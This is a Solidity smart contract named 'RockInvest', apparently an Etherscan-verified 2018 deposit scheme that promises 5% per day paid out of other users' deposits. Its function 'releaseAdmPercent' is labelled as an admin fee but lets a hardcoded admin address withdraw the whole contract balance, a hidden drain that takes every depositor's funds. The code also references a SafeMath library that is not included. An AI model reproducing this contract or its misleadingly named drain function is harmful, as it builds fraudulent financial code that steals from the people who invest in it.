/**

 *Submitted for verification at Etherscan.io on 2018-10-07

*/



pragma solidity ^0.4.25;

 



 

   

contract RockInvest {

    using SafeMath for uint256;

   

   

    address public constant admAddress = 0x35F55eBE0CAABaA7D0Ed7E6f4DbA414DF76EC4c4;

    

    mapping (address => uint256) deposited;

    mapping (address => uint256) withdrew;

    mapping (address => uint256) blocklock;

 

    uint256 public totalDepositedWei = 0;

    uint256 public totalWithdrewWei = 0;

    modifier admPercent(){

        require(msg.sender == admAddress);

        _;

    }

 

    function() payable external {

        if (deposited[msg.sender] != 0) {

            address investor = msg.sender;

            uint256 depositsPercents = deposited[msg.sender].mul(5).div(100).mul(block.number-blocklock[msg.sender]).div(5900);

            investor.transfer(depositsPercents);

 

            withdrew[msg.sender] += depositsPercents;

            totalWithdrewWei = totalWithdrewWei.add(depositsPercents);

			

			

        }

 

       

        blocklock[msg.sender] = block.number;

        deposited[msg.sender] += msg.value;

 

        totalDepositedWei = totalDepositedWei.add(msg.value);

    }

 

    function userDepositedWei(address _address) public view returns (uint256) {

        return deposited[_address];

    }

 

    function userWithdrewWei(address _address) public view returns (uint256) {

        return withdrew[_address];

    }

 

    function userDividendsWei(address _address) public view returns (uint256) {

        return deposited[_address].mul(5).div(100).mul(block.number-blocklock[_address]).div(5900);

    }

   

    function releaseAdmPercent() admPercent public {

        uint256 toParticipants = this.balance;

        admAddress.transfer(toParticipants);

    }

 

 

   

    function bytesToAddress(bytes bys) private pure returns (address addr) {

        assembly {

            addr := mload(add(bys, 20))

        }

    }

}